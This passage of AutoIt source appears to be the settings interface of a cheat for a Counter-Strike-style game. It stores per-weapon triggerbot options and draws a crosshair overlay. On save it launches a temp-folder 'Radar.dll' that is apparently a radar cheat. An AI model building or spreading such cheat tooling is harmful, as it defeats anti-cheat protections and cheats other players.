					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_g3sg1.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_g3sg1.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_g3sg1.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_g3sg1.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "m249"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_m249.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_m249.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_m249.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_m249.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_m249.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "m3"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_m3.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_m3.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_m3.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_m3.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_m3.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "mp5navy"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_mp5navy.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_mp5navy.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_mp5navy.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_mp5navy.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_mp5navy.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "scout"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_scout.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_scout.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_scout.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_scout.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_scout.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "sg550"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_sg550.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_sg550.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_sg550.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_sg550.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_sg550.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "sg552"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_sg552.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_sg552.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_sg552.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_sg552.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_sg552.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "tmp"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_tmp.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_tmp.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_tmp.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_tmp.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_tmp.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "xm1014"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_xm1014.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_xm1014.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_xm1014.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_xm1014.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_xm1014.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "negev"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_negev.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_negev.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_negev.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_negev.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_negev.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "sawedoff"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_sawedoff.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_sawedoffe.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_sawedoff.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_sawedoff.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_sawedoff.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "tec9"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_tec9.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_tec9.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_tec9.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_tec9.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_tec9.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "taser"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_taser.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_taser.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_taser.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_taser.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_taser.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "mp9"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_mp9.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_mp9.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_mp9.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_mp9.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_mp9.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "scar17"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_scar17.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_scar17.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_scar17.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_scar17.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_scar17.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "ssg08"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_ssg08.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_ssg08.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_ssg08.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_ssg08.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_ssg08.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf




		EndSwitch

			Case $thitleft
			$treadhitboxvalue -=1
			If $treadhitboxvalue < 1 Then
			$treadhitboxvalue = 1
			EndIf
			GUICtrlSetData($menuhitbox, $treadhitboxvalue)

			Case $thitright
			$treadhitboxvalue +=1
			GUICtrlSetData($menuhitbox, $treadhitboxvalue)








			Case $tkeymin
			$ptkey -=1
			If $ptkey < 1 Then
			$ptkey = 1
			EndIf
			GUICtrlSetData($tkeydis, $ptkey)

			Case $tkeyplus
			$ptkey +=1
			GUICtrlSetData($tkeydis, $ptkey)



			Case $beforeleft
			$treadbeforevalue -=1
			If $treadbeforevalue < 0 Then
			$treadbeforevalue = 0
			EndIf
			GUICtrlSetData($menubefore, $treadbeforevalue)

			Case $beforetright
			$treadbeforevalue +=1
			GUICtrlSetData($menubefore, $treadbeforevalue)

			Case $afterleft
			$treadaftervalue -=1
			If $treadaftervalue < 0 Then
			$treadaftervalue = 0
			EndIf
			GUICtrlSetData($menuafter, $treadaftervalue)

			Case $afterright
			$treadaftervalue +=1
			GUICtrlSetData($menuafter, $treadaftervalue)





			Case $radarplus
			$radardisread +=1
			GUICtrlSetData($radardistance, $radardisread)


			Case $radarmin
			$radardisread -=1
			If $radardisread < 1 Then
			$radardisread = 1
			EndIf
			GUICtrlSetData($radardistance,$radardisread)


			Case $rsave
				IniWrite($FileSet, "Settings", "Radar_Enabled", $radarenable)
				IniWrite($FileSet, "Settings", "Radar_Distance", $radardisread)


				If ProcessExists("Radar.dll") Then

				Else
				If $radarenable = 1 Then
				Run(@TempDir & "\Radar.dll")
				EndIf
				EndIf
				If $radarenable = 0 Then
					ProcessClose("Radar.dll")
				EndIf


			Case $Radaron
				If $radarenable = 1 Then
						GUICtrlSetImage($Radaron, @TempDir & "\Disable.bmp")
						$radarenable = 0
				Else
						GUICtrlSetImage($Radaron, @TempDir & "\Active.bmp")
						$radarenable = 1
				EndIf


			Case $Allbon
				If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
						$treadhitvalue = 0
				Else
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
						$treadhitvalue = 1
				EndIf


				Case $trigon
				If $treadenablevalue = 1 Then
						GUICtrlSetImage($trigon, @TempDir & "\Disable.bmp")
						$treadenablevalue = 0
				Else
						GUICtrlSetImage($trigon, @TempDir & "\Active.bmp")
						$treadenablevalue = 1
				EndIf


			Case $crosshairon
				If $Croshair = 1 Then
				GUICtrlSetImage($crosshairon, @TempDir & "\Disable.bmp")
				$Croshair = 0
				GUICtrlSetColor($dcrossgui, 0)
				GUICtrlSetColor($dcrossgui2, 0)
				GUICtrlSetColor($dcrossgui3, 0)
				IniWrite( $FileSet, "Settings", "Visuals.Crosshair", 0)
			Else
				GUICtrlSetImage($crosshairon, @TempDir & "\Active.bmp")
				$Croshair = 1
				GUICtrlSetColor($dcrossgui, 0xFF0000)
				GUICtrlSetColor($dcrossgui2, 0xFF0000)
				GUICtrlSetColor($dcrossgui3, 0xFF0000)
				IniWrite( $FileSet, "Settings", "Visuals.Crosshair", 1)
			EndIf

			Case $drawcrossplus
				$adup +=1
				GUICtrlSetData($drawcrossdis, $adup)
				IniWrite($FileSet, 'Settings', "Visuals.Crosshair.adup", $adup)
				GUICtrlSetPos($dcrossgui, $aClientSize[0] / 2 + $adside, $aClientSize[1] / 2 + $adup, 20, 20)
				GUICtrlSetPos($dcrossgui2, $aClientSize[0] / 2 + $adside + 9, $aClientSize[1] / 2 + $adup, 1, 20)
				GUICtrlSetPos($dcrossgui3, $aClientSize[0] / 2 + $adside, $aClientSize[1] / 2 + $adup + 10, 20, 1)

			Case $drawcrossmin
				$adup -=1
				GUICtrlSetData($drawcrossdis, $adup)
				IniWrite($FileSet, 'Settings', "Visuals.Crosshair.adup", $adup)
				GUICtrlSetPos($dcrossgui, $aClientSize[0] / 2 + $adside, $aClientSize[1] / 2 + $adup, 20, 20)
				GUICtrlSetPos($dcrossgui2, $aClientSize[0] / 2 + $adside + 9, $aClientSize[1] / 2 + $adup, 1, 20)
				GUICtrlSetPos($dcrossgui3, $aClientSize[0] / 2 + $adside, $aClientSize[1] / 2 + $adup + 10, 20, 1)

			Case $drawcrossplus2
				$adside +=1
				GUICtrlSetData($drawcrossdis2, $adside)
				IniWrite($FileSet, 'Settings', "Visuals.Crosshair.adside", $adside)
				GUICtrlSetPos($dcrossgui, $aClientSize[0] / 2 + $adside, $aClientSize[1] / 2 + $adup, 20, 20)
				GUICtrlSetPos($dcrossgui2, $aClientSize[0] / 2 + $adside + 9, $aClientSize[1] / 2 + $adup, 1, 20)
				GUICtrlSetPos($dcrossgui3, $aClientSize[0] / 2 + $adside, $aClientSize[1] / 2 + $adup + 10, 20, 1)

			Case $drawcrossmin2
				$adside -=1
				GUICtrlSetData($drawcrossdis2, $adside)
				IniWrite($FileSet, 'Settings', "Visuals.Crosshair.adside", $adside)
				GUICtrlSetPos($dcrossgui, $aClientSize[0] / 2 + $adside, $aClientSize[1] / 2 + $adup, 20, 20)
				GUICtrlSetPos($dcrossgui2, $aClientSize[0] / 2 + $adside + 9, $aClientSize[1] / 2 + $adup, 1, 20)
				GUICtrlSetPos($dcrossgui3, $aClientSize[0] / 2 + $adside, $aClientSize[1] / 2 + $adup + 10, 20, 1)

			Case $wateron
				If $watermarkactive = 1 Then
				GUICtrlSetImage($wateron, @TempDir & "\Disable.bmp")
				$watermarkactive = 0
				GUICtrlSetColor($watermark, 0)
				IniWrite( $FileSet, "Settings", "Watermark", 0)
			Else
				GUICtrlSetImage($wateron, @TempDir & "\Active.bmp")
				$watermarkactive = 1
				GUICtrlSetColor($watermark, 0xFF0000)
				IniWrite( $FileSet, "Settings", "Watermark", 1)
			EndIf


			Case $tsave
				$treadw = GUICtrlRead($thCombo)
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				If $treadw = "Deagle" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_deagle.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_deagle.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_deagle.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_deagle.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_deagle.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "P2000" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_P2000.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_P2000.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_P2000.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_P2000.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_P2000.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "elite" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_elite.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_elite.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_elite.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_elite.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_elite.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "p90" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_p90.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_p90.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_p90.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_p90.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_p90.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "mac10" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mac10.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mac10.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mac10.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mac10.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mac10.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "bizon" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_bizon.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_bizon.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_bizon.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_bizon.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_bizon.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "sg553" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sg553.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sg553.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sg553.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sg553.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sg553.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "fiveseven" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_fiveseven.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_fiveseven.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_fiveseven.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_fiveseven.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_fiveseven.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "glock" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_glock.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_glock.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_glock.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_glock.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_glock.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "p228" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_p228.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_p228.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_p228.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_p228.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_p228.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "p250" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_p250.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_p250.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_p250.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_p250.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_p250.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "usp" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_usp.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_usp.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_usp.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_usp.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_usp.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "famas" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_famas.enabled", $treadenablevalue)
